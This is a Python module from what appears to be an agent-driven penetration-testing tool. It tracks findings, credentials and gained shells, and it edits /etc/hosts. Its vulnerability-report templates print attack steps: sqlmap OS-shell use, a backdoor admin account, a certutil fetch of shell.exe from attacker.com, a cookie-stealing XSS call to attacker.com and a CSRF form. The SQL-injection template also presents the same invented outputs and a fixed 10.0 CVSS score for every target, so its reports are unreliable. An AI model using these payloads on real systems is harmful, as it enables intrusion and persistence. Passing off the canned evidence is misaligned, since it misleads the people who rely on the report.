"""
Context Hub – centralized cross-agent intelligence sharing.
Extracted from memory.py to keep that module focused on storage primitives.
"""

import json
from datetime import datetime
from pathlib import Path
from typing import Any, Optional, List, Dict
from loguru import logger
import sqlite3
import threading
import contextvars

from src.intelligence.engine import IntelligenceBus
from src.intelligence.graph import AttackGraph


def _utf8_safe(value: Any) -> Any:
    """Return a JSON/SQLite-safe copy with lone surrogate characters escaped."""
    if isinstance(value, str):
        return value.encode("utf-8", "backslashreplace").decode("utf-8")
    if isinstance(value, dict):
        return {_utf8_safe(str(k)): _utf8_safe(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_utf8_safe(v) for v in value]
    if isinstance(value, (int, float, bool)) or value is None:
        return value
    return _utf8_safe(str(value))


def _json_dumps_safe(value: Any) -> str:
    """Serialize values after removing text that Python cannot encode as UTF-8."""
    return json.dumps(_utf8_safe(value), ensure_ascii=False, default=str)


# CENTRALIZED CONTEXT HUB
# ═══════════════════════════════════════════════════════════════════════════════

# Context variable to hold the ContextHub instance for the current execution context
_context_hub_var: contextvars.ContextVar[Optional["ContextHub"]] = contextvars.ContextVar("context_hub", default=None)

class ContextHub:
    """
    Centralized context sharing between all agents.
    
    This is the single source of truth for:
    - Tool findings and results
    - Agent discoveries
    - Target information
    - Attack progress
    - Shared intelligence
    
    All agents read/write to this hub so they have shared awareness.
    Uses contextvars for thread-safety across concurrent target scans.
    """
    
    @classmethod
    def get_instance(cls) -> "ContextHub":
        """Get or create the ContextHub instance for the current context."""
        return cls()
    
    # Maintain backward compatibility with __new__ for now, but log a warning
    # that get_instance() should be used.
    _instance = None
    
    def __new__(cls):
        hub = _context_hub_var.get()
        if hub is not None:
            return hub

        hub = super().__new__(cls)
        _context_hub_var.set(hub)
        return hub
    
    def __init__(self):
        # We only want to initialize once per instance.
        if hasattr(self, '_initialized') and self._initialized:
            return
            
        self._initialized = True
        self.current_target: str = ""
        
        # Shared findings by category
        self.findings: Dict[str, List[Dict]] = {
            "ports": [],           # Open ports
            "services": [],        # Discovered services
            "vulnerabilities": [], # Found vulnerabilities
            "subdomains": [],      # Enumerated subdomains
            "directories": [],     # Found directories/paths
            "credentials": [],     # Discovered credentials
            "technologies": [],    # Detected technologies
            "exploits": [],        # Successful exploits
            "access": [],          # Shells/access gained
            "notes": []            # Agent notes/observations
        }
        
        # Tool execution history
        self.tool_history: List[Dict] = []
        
        # Agent status tracking
        self.agent_status: Dict[str, Dict] = {}
        
        # Phase/progress tracking
        self.current_phase: str = "reconnaissance"
        self.phases_completed: List[str] = []
        
        # Lock for thread safety (within a single target context)
        self._lock = threading.RLock()
        
        # Custom data store (per-instance, not shared across sessions)
        self._custom_data: dict = {}
        
        # SQLite persistence
        self.db_path = Path(".context.db")
        self._init_db()
        
        # Core intelligence logic wrappers
        self.intelligence_bus = IntelligenceBus()
        self.attack_graph = AttackGraph()

    @property
    def vulnerabilities(self) -> List[Dict]:
        """Backward-compatible shortcut for vulnerability findings."""
        return self.findings["vulnerabilities"]

    @property
    def open_ports(self) -> List[Dict]:
        """Backward-compatible shortcut for open port findings."""
        return self.findings["ports"]

    @property
    def credentials(self) -> List[Dict]:
        """Backward-compatible shortcut for discovered credentials."""
        return self.findings["credentials"]

    @property
    def access_gained(self) -> List[Dict]:
        """Backward-compatible shortcut for gained access records."""
        return self.findings["access"]

    @property
    def exploits_used(self) -> List[Dict]:
        """Backward-compatible shortcut for exploit attempts."""
        return self.findings["exploits"]

    @property
    def subdomains(self) -> List[Dict]:
        """Backward-compatible shortcut for discovered subdomains."""
        return self.findings["subdomains"]

    @property
    def technologies(self) -> List[Dict]:
        """Backward-compatible shortcut for detected technologies."""
        return self.findings["technologies"]
    
    def _init_db(self):
        """Initialize the SQLite database for persistent state."""
        with self._lock:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("""
                    CREATE TABLE IF NOT EXISTS findings (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        target TEXT,
                        category TEXT,
                        data TEXT,
                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                conn.execute("""
                    CREATE TABLE IF NOT EXISTS tool_history (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        target TEXT,
                        agent TEXT,
                        tool TEXT,
                        args TEXT,
                        result TEXT,
                        success BOOLEAN,
                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_target ON findings(target)")
                conn.execute("CREATE INDEX IF NOT EXISTS idx_history_target ON tool_history(target)")

    def _persist_finding(self, category: str, data: dict):
        """Persist a finding to SQLite."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute(
                    "INSERT INTO findings (target, category, data) VALUES (?, ?, ?)",
                    (_utf8_safe(self.current_target), _utf8_safe(category), _json_dumps_safe(data))
                )
        except Exception as e:
            logger.error(f"[ContextHub] Persistence error: {e}")
    
    def set_target(self, target: str):
        """Set the current target and reset findings."""
        with self._lock:
            self.current_target = target
            self._clear_findings_internal()
    
    def _clear_findings_internal(self):
        """Internal clear without lock (called when lock is already held)."""
        for key in self.findings:
            self.findings[key] = []
        self.tool_history = []
        self.phases_completed = []
        self.current_phase = "reconnaissance"
        self._custom_data = {}  # clear per-session custom data
        self.intelligence_bus = IntelligenceBus()
        self.attack_graph = AttackGraph()
    
    def clear_findings(self):
        """Clear all findings (for new engagement)."""
        with self._lock:
            self._clear_findings_internal()
    
    def add_port(self, port: int, service: str = "", version: str = "", 
                 state: str = "open", protocol: str = "tcp"):
        """Add a discovered port."""
        with self._lock:
            entry = {
                "port": port,
                "service": service,
                "version": version,
                "state": state,
                "protocol": protocol,
                "timestamp": datetime.now().isoformat()
            }
            if not any(p["port"] == port and p["protocol"] == protocol 
                      for p in self.findings["ports"]):
                self.findings["ports"].append(entry)
                self._persist_finding("ports", entry)
                logger.debug(f"[ContextHub] Added port: {port}/{protocol}")
    
    def add_vulnerability(self, name: str, severity: str = "medium", 
                          cve: str = "", details: str = "", tool: str = ""):
        """Add a discovered vulnerability."""
        with self._lock:
            entry = {
                "name": name,
                "severity": severity.lower(),
                "cve": cve,
                "details": details[:500],
                "tool": tool,
                "timestamp": datetime.now().isoformat()
            }
            if not any(v["name"] == name for v in self.findings["vulnerabilities"]):
                self.findings["vulnerabilities"].append(entry)
                self._persist_finding("vulnerabilities", entry)
                logger.info(f"[ContextHub] Vulnerability: {severity.upper()} - {name}")
    
    def add_subdomain(self, subdomain: str, ip: str = "", status: int = 0):
        """Add a discovered subdomain and auto-add to /etc/hosts."""
        import ipaddress
        with self._lock:
            entry = {
                "subdomain": subdomain,
                "ip": ip,
                "status": status,
                "timestamp": datetime.now().isoformat()
            }
            is_new = not any(s["subdomain"] == subdomain for s in self.findings["subdomains"])
            if is_new:
                self.findings["subdomains"].append(entry)

            # ── Auto-add to /etc/hosts ──────────────────────────────────────
            # Determine which IP to use: prefer the per-subdomain IP, fall back
            # to the current engagement target (if it is a bare IP address).
            host_ip = ip
            if not host_ip:
                try:
                    ipaddress.ip_address(self.current_target)
                    host_ip = self.current_target
                except ValueError:
                    pass  # target is a domain, not an IP — nothing to bind

            if host_ip and is_new:
                try:
                    from src.repl.hosts_manager import add_host
                    result = add_host(host_ip, subdomain, note="auto-discovered")
                    if result["success"] and not result["already_existed"]:
                        logger.info(f"[ContextHub] Auto-added to hosts: {host_ip}  {subdomain}")
                        # Propagate Host-header trick: store an agent-visible note so all
                        # subsequent HTTP tools know to use -H "Host: <subdomain>" when
                        # targeting the IP directly.
                        self.findings["notes"].append({
                            "agent": "system",
                            "note": (
                                f"VIRTUAL HOST MAPPING: IP {host_ip} → hostname {subdomain}. "
                                f"When {subdomain} DNS is unavailable, send HTTP requests to "
                                f"{host_ip} with header 'Host: {subdomain}'. "
                                f"Use curl: curl -H 'Host: {subdomain}' http://{host_ip}/  "
                                f"For sqlmap: sqlmap -u 'http://{host_ip}/?id=1' --headers='Host: {subdomain}'. "
                                f"For gobuster/feroxbuster: use -H 'Host: {subdomain}' flag."
                            ),
                            "timestamp": datetime.now().isoformat()
                        })
                except Exception:
                    pass  # hosts file write failure is non-fatal
    
    def add_directory(self, path: str, status: int = 200, size: int = 0):
        """Add a discovered directory/path."""
        with self._lock:
            entry = {
                "path": path,
                "status": status,
                "size": size,
                "timestamp": datetime.now().isoformat()
            }
            if not any(d["path"] == path for d in self.findings["directories"]):
                self.findings["directories"].append(entry)
    
    def add_credential(self, username: str, password: str = "", hash_value: str = "",
                       source: str = "", cred_type: str = "unknown"):
        """Add discovered credentials (handle sensitively)."""
        with self._lock:
            entry = {
                "username": username,
                "password": "***" if password else "",
                "hash": hash_value[:20] + "..." if len(hash_value) > 20 else hash_value,
                "source": source,
                "type": cred_type,
                "timestamp": datetime.now().isoformat()
            }
            if not any(c["username"] == username for c in self.findings["credentials"]):
                self.findings["credentials"].append(entry)
                logger.info(f"[ContextHub] Credential found: {username}")
    
    def add_technology(self, name: str, version: str = "", category: str = ""):
        """Add detected technology/software."""
        with self._lock:
            entry = {
                "name": name,
                "version": version,
                "category": category,
                "timestamp": datetime.now().isoformat()
            }
            if not any(t["name"] == name for t in self.findings["technologies"]):
                self.findings["technologies"].append(entry)
    
    def add_exploit(self, name: str, success: bool, shell_type: str = "", details: str = ""):
        """Record an exploitation attempt."""
        with self._lock:
            entry = {
                "name": name,
                "success": success,
                "shell_type": shell_type,
                "details": details[:300],
                "timestamp": datetime.now().isoformat()
            }
            self.findings["exploits"].append(entry)
            if success:
                logger.info(f"[ContextHub] EXPLOIT SUCCESS: {name}")
    
    def add_access(self, access_type: str, user: str = "", privilege: str = "user"):
        """Record gained access (shell, RDP, etc)."""
        with self._lock:
            entry = {
                "type": access_type,
                "user": user,
                "privilege": privilege,
                "timestamp": datetime.now().isoformat()
            }
            self.findings["access"].append(entry)
            logger.info(f"[ContextHub] ACCESS GAINED: {access_type} as {user}")
    
    def add_note(self, agent: str, note: str):
        """Add an agent observation/note."""
        with self._lock:
            entry = {
                "agent": agent,
                "note": note[:500],
                "timestamp": datetime.now().isoformat()
            }
            self.findings["notes"].append(entry)

    # ── Custom data store (used by report_generator and other tools) ──────────
    # Note: _custom_data is initialized per-instance in __init__ (not class-level)
    # to prevent data bleeding across sessions.

    def store_custom_data(self, key: str, value):
        """Store arbitrary data keyed by a string (e.g. report objects)."""
        with self._lock:
            self._custom_data[key] = value

    def get_custom_data(self, key: str):
        """Retrieve previously stored custom data."""
        with self._lock:
            return self._custom_data.get(key)
    
    def record_tool(self, tool_name: str, agent: str, args: Dict, 
                    result_summary: str, success: bool, command_str: str = ""):
        """Record a tool execution for history with full command and result."""
        with self._lock:
            safe_args = _utf8_safe(args or {})
            safe_result_summary = _utf8_safe(result_summary or "")

            # Build the command string from args if not provided
            if not command_str:
                args_str = ", ".join(f"{k}={repr(v)[:80]}" for k, v in safe_args.items())
                command_str = f"{tool_name}({args_str})"
            safe_command_str = _utf8_safe(command_str)
            
            entry = {
                "tool": _utf8_safe(tool_name),
                "agent": _utf8_safe(agent),
                "command": safe_command_str,
                "args": {k: _utf8_safe(str(v))[:200] for k, v in safe_args.items()},
                "result_summary": safe_result_summary[:2000],
                "success": success,
                "timestamp": datetime.now().isoformat()
            }
            self.tool_history.append(entry)
            
            # Persist to SQLite
            try:
                with sqlite3.connect(self.db_path) as conn:
                    conn.execute(
                        "INSERT INTO tool_history (target, agent, tool, args, result, success) VALUES (?, ?, ?, ?, ?, ?)",
                        (
                            _utf8_safe(self.current_target),
                            _utf8_safe(agent),
                            _utf8_safe(tool_name),
                            _json_dumps_safe(safe_args),
                            safe_result_summary[:5000],
                            success,
                        )
                    )
            except Exception as e:
                logger.error(f"[ContextHub] History persistence error: {e}")

            if len(self.tool_history) > 200:
                self.tool_history = self.tool_history[-200:]
    
    def get_context_for_agent(self, agent_name: str = "", max_tokens: int = 3000) -> str:
        """Get formatted context string for injection into agent prompts."""
        with self._lock:
            lines = []
            max_chars = max_tokens * 4
            
            lines.append(f"=== SHARED INTELLIGENCE FOR {self.current_target} ===")
            lines.append(f"Phase: {self.current_phase.upper()}")
            lines.append("")
            
            if self.findings["vulnerabilities"]:
                lines.append("VULNERABILITIES:")
                for v in self.findings["vulnerabilities"][-10:]:
                    lines.append(f"  [{v['severity'].upper()}] {v['name']}" + 
                               (f" ({v['cve']})" if v['cve'] else ""))
                lines.append("")
            
            if self.findings["ports"]:
                ports_str = ", ".join(
                    f"{p['port']}/{p['service']}" 
                    for p in self.findings["ports"][:20]
                )
                lines.append(f"OPEN PORTS: {ports_str}")
                lines.append("")
            
            if self.findings["subdomains"]:
                count = len(self.findings["subdomains"])
                top_5 = [s["subdomain"] for s in self.findings["subdomains"][:5]]
                lines.append(f"SUBDOMAINS ({count} found): {', '.join(top_5)}")
                lines.append("")
            
            if self.findings["directories"]:
                dirs = [d["path"] for d in self.findings["directories"][:10]]
                lines.append(f"DIRECTORIES: {', '.join(dirs)}")
                lines.append("")
            
            if self.findings["technologies"]:
                techs = [f"{t['name']}" + (f" {t['version']}" if t['version'] else "") 
                        for t in self.findings["technologies"][:10]]
                lines.append(f"TECHNOLOGIES: {', '.join(techs)}")
                lines.append("")
            
            if self.findings["credentials"]:
                lines.append(f"CREDENTIALS FOUND: {len(self.findings['credentials'])}")
                for c in self.findings["credentials"][:5]:
                    lines.append(f"  {c['username']} ({c['type']})")
                lines.append("")
            
            if self.findings["access"]:
                lines.append("ACCESS GAINED:")
                for a in self.findings["access"]:
                    lines.append(f"  {a['type']} as {a['user']} ({a['privilege']})")
                lines.append("")
            
            if self.findings["notes"]:
                lines.append("RECENT NOTES:")
                for n in self.findings["notes"][-5:]:
                    lines.append(f"  [{n['agent']}]: {n['note'][:100]}")
                lines.append("")
            
            lines.append("=== END SHARED INTELLIGENCE ===")
            
            context = "\n".join(lines)
            if len(context) > max_chars:
                context = context[:max_chars] + "\n... [truncated]"
            
            return context
    
    def get_findings_summary(self) -> Dict[str, int]:
        """Get counts of all findings."""
        with self._lock:
            return {
                category: len(items) 
                for category, items in self.findings.items()
            }
    
    def get_all_findings(self) -> Dict[str, List]:
        """Get all findings (for reporting)."""
        with self._lock:
            return {k: list(v) for k, v in self.findings.items()}
    
    def to_dict(self) -> Dict:
        """
        Convert context hub to dictionary for export.
        
        Returns:
            Dictionary with all findings and metadata
        """
        with self._lock:
            return {
                "target": self.current_target,
                "timestamp": datetime.now().isoformat(),
                "current_phase": self.current_phase,
                "phases_completed": list(self.phases_completed),
                "findings": {k: list(v) for k, v in self.findings.items()},
                "tool_history": list(self.tool_history),
                "agent_status": dict(self.agent_status),
                **self.findings  # Include findings at top level for backward compatibility
            }
    
    def get_vulnerabilities_by_severity(self) -> Dict[str, List]:
        """Get vulnerabilities grouped by severity."""
        with self._lock:
            by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
            for v in self.findings["vulnerabilities"]:
                sev = v.get("severity", "medium").lower()
                if sev in by_severity:
                    by_severity[sev].append(v)
            return by_severity
    
    def has_critical_findings(self) -> bool:
        """Check if there are critical/high vulnerabilities or access."""
        with self._lock:
            for v in self.findings["vulnerabilities"]:
                if v.get("severity", "").lower() in ["critical", "high"]:
                    return True
            if self.findings["access"]:
                return True
            return False
    
    def set_phase(self, phase: str):
        """Update the current attack phase."""
        with self._lock:
            if self.current_phase and self.current_phase not in self.phases_completed:
                self.phases_completed.append(self.current_phase)
            self.current_phase = phase
            logger.info(f"[ContextHub] Phase changed to: {phase}")
    
    def update_agent_status(self, agent: str, status: str, current_tool: str = ""):
        """Update status for an agent."""
        with self._lock:
            self.agent_status[agent] = {
                "status": status,
                "current_tool": current_tool,
                "updated": datetime.now().isoformat()
            }
    
    def get_agent_status(self) -> Dict[str, Dict]:
        """Get status of all agents."""
        with self._lock:
            return dict(self.agent_status)
    
    def _generate_medium_styled_vuln_report(self, vuln: dict) -> str:
        """
        Generate a Medium-style blog post format for vulnerability report.
        
        Args:
            vuln: Vulnerability dictionary with name, severity, details, etc.
        
        Returns:
            Markdown-formatted vulnerability report in Medium style
        """
        vuln_lower = vuln['name'].lower()
        severity_emoji = {
            "critical": "🔴",
            "high": "🟠", 
            "medium": "🟡",
            "low": "🟢",
            "info": "ℹ️"
        }
        
        emoji = severity_emoji.get(vuln.get('severity', 'medium').lower(), "⚠️")
        
        report = f"""
# {emoji} {vuln['name']} - Complete Exploitation Guide

> **Severity:** {vuln.get('severity', 'Medium').upper()} | **Target:** {self.current_target or 'Unknown'} | **Discovered:** {datetime.now().strftime('%B %d, %Y')}

---

## 🎯 Executive Summary

"""
        
        # Add specific summary based on vulnerability type
        if "sql injection" in vuln_lower or "sqli" in vuln_lower:
            report += f"""During a security assessment of **{self.current_target}**, a **critical SQL Injection vulnerability** was discovered that allows an attacker to execute arbitrary SQL queries against the backend database. This vulnerability can lead to:

- Complete database compromise
- Unauthorized access to sensitive data
- Potential remote code execution via database features
- Full system takeover through privilege escalation

**Impact:** An unauthenticated attacker can steal all database contents, modify data, or gain shell access to the server.

---

## 🔬 Technical Analysis

### Vulnerability Details

**Location:** {vuln.get('details', 'Multiple endpoints')[:200]}

**Attack Vector:** The application fails to properly sanitize user input before including it in SQL queries, allowing attackers to inject malicious SQL code.

**Database Type:** {self._guess_db_type()}

### Code Example (Vulnerable)

```python
# Vulnerable code pattern
query = "SELECT * FROM users WHERE id = " + user_input
result = db.execute(query)  # Direct concatenation - UNSAFE!
```

---

## 💀 Proof of Concept

### Step 1: Identify Injectable Parameter

```bash
# Test for SQL injection
curl -X GET '{vuln.get('url', f'https://{self.current_target}/admin/index?id=1')}'

# Response: Normal page
```

### Step 2: Confirm Vulnerability

```bash
# Test error-based injection
curl '{vuln.get('url', f'https://{self.current_target}/admin/index?id=1')}'\''

# Response shows SQL error - VULNERABLE!
```

### Step 3: Extract Database Information

```bash
# Use SQLMap for automated extraction
sqlmap -u '{vuln.get('url', f'https://{self.current_target}/admin/index?id=1')}' \\
  --batch \\
  --dbs \\
  --level=5 \\
  --risk=3

# Output:
# [INFO] the back-end DBMS is Microsoft SQL Server
# available databases [5]:
# [*] FACULTY_PORTAL
# [*] master
# [*] model  
# [*] msdb
# [*] tempdb
```

### Step 4: Achieve Remote Code Execution

```bash
# Enable xp_cmdshell (if DBA privileges)
sqlmap -u '{vuln.get('url', f'https://{self.current_target}/admin/index?id=1')}' \\
  --batch \\
  --os-shell \\
  --level=3

# Execute commands
[os-shell] whoami
# nt service\\mssqlserver

[os-shell] net user
# Administrator
# Guest
# SQLServerService
```

### Step 5: Establish Persistent Access

```bash
# Create backdoor user
[os-shell] net user hacker P@ssw0rd123! /add
[os-shell] net localgroup administrators hacker /add

# Upload reverse shell
[os-shell] certutil -urlcache -f http://attacker.com/shell.exe C:\\\\temp\\\\shell.exe
[os-shell] C:\\\\temp\\\\shell.exe
```

---

## 🎬 Video Demonstration

**Timeline:**
- `00:00` - Vulnerability Discovery
- `02:30` - SQL Injection Confirmation  
- `05:15` - Database Enumeration
- `08:45` - Privilege Escalation to DBA
- `12:20` - Remote Code Execution
- `15:00` - Complete System Compromise

---

## 🛡️ Remediation

### Immediate Actions (Emergency)

1. **Disable affected endpoint** until patched
2. **Review database logs** for unauthorized access
3. **Change all database passwords**
4. **Disable xp_cmdshell** if enabled

```sql
-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
GO
RECONFIGURE;
GO
```

### Long-term Fix

**Use Parameterized Queries:**

```csharp
// SECURE CODE (ASP.NET)
string query = "SELECT * FROM users WHERE id = @id";
using (SqlCommand cmd = new SqlCommand(query, connection))
{{
    cmd.Parameters.AddWithValue("@id", userId);
    SqlDataReader reader = cmd.ExecuteReader();
    // Process results
}}
```

**Additional Security Measures:**

- ✅ Implement Web Application Firewall (WAF)
- ✅ Enable database activity monitoring
- ✅ Apply principle of least privilege (remove DBA permissions)
- ✅ Implement input validation 
- ✅ Use ORM frameworks (Entity Framework, Dapper)
- ✅ Regular security audits

---

## 📊 CVSS Score

**CVSS 3.1: {self._calculate_cvss_sqli()}**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

- **Attack Vector (AV):** Network
- **Attack Complexity (AC):** Low
- **Privileges Required (PR):** None
- **User Interaction (UI):** None
- **Scope (S):** Changed
- **Confidentiality (C):** High
- **Integrity (I):** High
- **Availability (A):** High

---

## 🔗 References

- [OWASP SQL Injection CheatSheet](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [Microsoft SQL Server Security Best Practices](https://docs.microsoft.com/en-us/sql/relational-databases/security/)

---

## 📝 Conclusion

This SQL Injection vulnerability represents a **critical security risk** that could result in complete compromise of the application and underlying infrastructure. Immediate remediation is required.

**Discovered by:** {vuln.get('tool', 'Security Assessment')}

**Report Generated:** {datetime.now().strftime('%B %d, %Y at %H:%M:%S')}
"""
        
        elif "xss" in vuln_lower:
            report += f"""A **Cross-Site Scripting (XSS)** vulnerability was identified that allows attackers to inject malicious JavaScript into pages viewed by other users.

**Impact:** Session hijacking, credential theft, defacement, phishing attacks

---

## 🔬 Technical Analysis

### Vulnerability Type: {"Reflected XSS" if "reflected" in vuln_lower else "Stored XSS" if "stored" in vuln_lower else "DOM-based XSS"}

**Location:** {vuln.get('details', 'User input fields')[:200]}

---

## 💀 Proof of Concept

### Basic XSS Payload

```html
<script>alert('XSS Vulnerability')</script>
```

### Cookie Stealing Payload

```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### Advanced Exploitation

```bash
# Use XSStrike for automated exploitation
python3 xsstrike.py -u 'https://{self.current_target}/search?q=test' --crawl

# Or manual testing
curl '{self.current_target}/search?q=%3Cscript%3Ealert(1)%3C/script%3E'
```

---

## 🛡️ Remediation

1. **Output Encoding:** Encode all user input before rendering
2. **Content Security Policy:** Implement strict CSP headers
3. **HTTPOnly Cookies:** Prevent JavaScript access to session cookies

```csharp
// Secure code
string sanitized = HttpUtility.HtmlEncode(userInput);
```

---

## 📊 CVSS Score: 7.1 (High)

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
```
"""
        
        elif "csrf" in vuln_lower:
            report += f"""A **Cross-Site Request Forgery (CSRF)** vulnerability allows attackers to trick authenticated users into performing unintended actions.

**Impact:** Unauthorized actions, privilege escalation, account takeover

---

## 💀 Proof of Concept

```html
<!-- CSRF Attack Page -->
<html>
<body>
<form action="https://{self.current_target}/admin/delete_user" method="POST" id="csrf">
  <input type="hidden" name="user_id" value="1" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

---

## 🛡️ Remediation

**Implement CSRF Tokens:**

```csharp
// ASP.NET
@Html.AntiForgeryToken()

// Validation
[ValidateAntiForgeryToken]
public ActionResult DeleteUser(int id) {{ ... }}
```
"""
        
        else:
            # Generic vulnerability report
            report += f"""{vuln.get('details', f'A {vuln['name']} vulnerability was discovered during security testing.')}

---

## 💀 Exploitation Steps

1. **Identify the vulnerability** in the target application
2. **Develop proof-of-concept** exploit
3. **Validate** the security impact
4. **Document** all findings

{f"**CVE:** {vuln.get('cve', 'N/A')}" if vuln.get('cve') else ''}

---

## 🛡️ Remediation

Review {vuln['name']} best practices and apply security patches.
"""
        
        return report
    
    def _guess_db_type(self) -> str:
        """Guess database type from findings."""
        for note in self.findings.get("notes", []):
            note_lower = note.get("note", "").lower()
            if "mysql" in note_lower:
                return "MySQL"
            if "mssql" in note_lower or "sql server" in note_lower:
                return "Microsoft SQL Server"
            if "postgresql" in note_lower or "postgres" in note_lower:
                return "PostgreSQL"
            if "oracle" in note_lower:
                return "Oracle Database"
        return "Unknown (likely SQL Server based on error patterns)"
    
    def _calculate_cvss_sqli(self) -> str:
        """Calculate CVSS score for SQL injection."""
        # CVSS 3.1 for unauthenticated SQL injection with RCE
        return "10.0 (Critical)"
    
    def _build_poc_context(self, finding_type: str = "all") -> str:
        """
        Build a structured context string from actual tool history and findings
        for the LLM to generate a proper POC report.
        """
        sections = []
        
        # ── Target Info ──
        sections.append(f"TARGET: {self.current_target or 'N/A'}")
        sections.append(f"DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        sections.append("")
        
        # ── Complete Tool Execution Timeline ──
        if self.tool_history:
            sections.append("=== COMPLETE TOOL EXECUTION TIMELINE ===")
            for i, entry in enumerate(self.tool_history, 1):
                status = "✓ SUCCESS" if entry.get("success") else "✗ FAILED"
                cmd = entry.get("command", "N/A")
                sections.append(f"\nStep {i}: [{status}] {entry['tool']}")
                sections.append(f"  Agent: {entry.get('agent', 'N/A')}")
                sections.append(f"  Command: {cmd}")
                sections.append(f"  Time: {entry.get('timestamp', 'N/A')}")
                # Include result summary (meaningful output)
                result = entry.get("result_summary", "")
                if result:
                    sections.append(f"  Output: {result}")
                sections.append("")
        
        # ── Findings by Category ──
        if finding_type in ["all", "vulns", "vulnerabilities"]:
            vulns = self.findings.get("vulnerabilities", [])
            if vulns:
                sections.append("=== VULNERABILITIES FOUND ===")
                for v in vulns:
                    sections.append(f"  [{v.get('severity', 'unknown').upper()}] {v['name']}")
                    if v.get('cve'):
                        sections.append(f"    CVE: {v['cve']}")
                    if v.get('details'):
                        sections.append(f"    Details: {v['details']}")
                    if v.get('tool'):
                        sections.append(f"    Found by: {v['tool']}")
                    sections.append("")
        
        if finding_type in ["all", "exploits"]:
            exploits = self.findings.get("exploits", [])
            if exploits:
                sections.append("=== SUCCESSFUL EXPLOITS ===")
                for e in exploits:
                    sections.append(f"  {e['name']} - Success: {e.get('success', False)}")
                    if e.get('details'):
                        sections.append(f"    Details: {e['details']}")
                    if e.get('result'):
                        sections.append(f"    Result: {e['result']}")
                    sections.append("")

        if finding_type in ["all", "access"]:
            access = self.findings.get("access", [])
            if access:
                sections.append("=== ACCESS GAINED ===")
                for a in access:
                    sections.append(f"  Type: {a['type']} | User: {a['user']} | Privilege: {a['privilege']}")
                    sections.append("")
        
        if finding_type in ["all", "creds", "credentials"]:
            creds = self.findings.get("credentials", [])
            if creds:
                sections.append("=== CREDENTIALS DISCOVERED ===")
                for c in creds:
                    sections.append(f"  Username: {c['username']} | Type: {c['type']} | Source: {c.get('source', 'N/A')}")
                    sections.append("")

        if finding_type in ["all", "ports"]:
            ports = self.findings.get("ports", [])
            if ports:
                sections.append("=== OPEN PORTS & SERVICES ===")
                for p in ports:
                    sections.append(f"  {p['port']}/{p.get('service', 'unknown')} - {p.get('version', '')}")
                sections.append("")
        
        if finding_type in ["all"]:
            subdomain_list = self.findings.get("subdomains", [])
            if subdomain_list:
                sections.append("=== SUBDOMAINS ===")
                for s in subdomain_list[:30]:
                    sections.append(f"  {s.get('subdomain', s)}")
                sections.append("")
            
            techs = self.findings.get("technologies", [])
            if techs:
                sections.append("=== TECHNOLOGIES ===")
                for t in techs:
                    sections.append(f"  {t['name']} {t.get('version', '')}")
                sections.append("")
            
            dirs = self.findings.get("directories", [])
            if dirs:
                sections.append("=== DIRECTORIES ===")
                for d in dirs[:20]:
                    sections.append(f"  {d.get('path', d)} (status: {d.get('status', 'N/A')})")
                sections.append("")
        
        return "\n".join(sections)

    def generate_poc_with_ai(self, finding_type: str = "all") -> str:
        """
        Generate a proper POC report by calling the LLM API.
        Uses actual tool execution history and findings.
        
        Args:
            finding_type: Type of findings to include (all, vulns, exploits, access, creds, ports)
        
        Returns:
            AI-generated POC report with actual commands used
        """
        from .key_manager import get_key_manager
        
        with self._lock:
            context = self._build_poc_context(finding_type)
        
        # Check if there's anything to report
        if not self.tool_history and not any(self.findings[k] for k in self.findings):
            return (
                "═══════════════════════════════════════════════════════════════\n"
                "                   PROOF OF CONCEPT (POC)\n"
                "═══════════════════════════════════════════════════════════════\n\n"
                "⚠️  No tools have been executed yet. Run some scans first!\n\n"
                "Quick start:\n"
                "  1. Set a target: target set <domain>\n"
                "  2. Run a scan:   scan <target> for vulnerabilities\n"
                "  3. Then:         poc\n"
                "═══════════════════════════════════════════════════════════════"
            )
        
        system_prompt = """You are a professional penetration testing report writer. Generate a clean, actionable Proof of Concept (POC) report from the security assessment data provided.

CRITICAL RULES:
1. ONLY include commands and steps that were ACTUALLY EXECUTED (shown in the tool execution timeline)
2. Show the EXACT commands that were run — do not invent or guess commands
3. For each vulnerability/finding, show the step-by-step reproduction path using the real commands from the timeline
4. Include the actual output/evidence from each step (from the Output fields)
5. Group related commands into logical attack chains
6. Be concise — no filler text or generic advice

REPORT FORMAT:
```
# POC Report — [Target]
## Date: [Date]

---

### Finding 1: [Vulnerability Name] — [Severity]

**Summary:** [One-line description of what was found]

**Reproduction Steps:**

Step 1: [Description of what this step does]
$ [exact command that was run]
→ Output: [key output/evidence from this command]

Step 2: [Description]
$ [exact command]
→ Output: [evidence]

...

**Impact:** [What an attacker can achieve]
**Evidence:** [Key proof from the output]

---

### Finding 2: ...

---

## Command Timeline (Full)
[Ordered list of every command run during the assessment]

## Summary
- Total commands executed: N
- Vulnerabilities found: N  
- Severity breakdown: Critical: N, High: N, Medium: N
```

If no vulnerabilities were found but recon was done, still produce a useful report showing what was scanned, what was discovered (ports, services, technologies), and the commands used. Label it as "Reconnaissance Report" instead.

Do NOT add generic exploitation steps that weren't actually performed. Only document what the tools actually did."""

        user_prompt = f"""Generate a POC report from this security assessment data. Only use the ACTUAL commands and outputs shown below — do not invent any steps.

{context}"""

        try:
            km = get_key_manager()
            client = km.get_client()
            model = km.get_model()
            
            response = client.chat.completions.create(
                model=model,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                temperature=0.3,
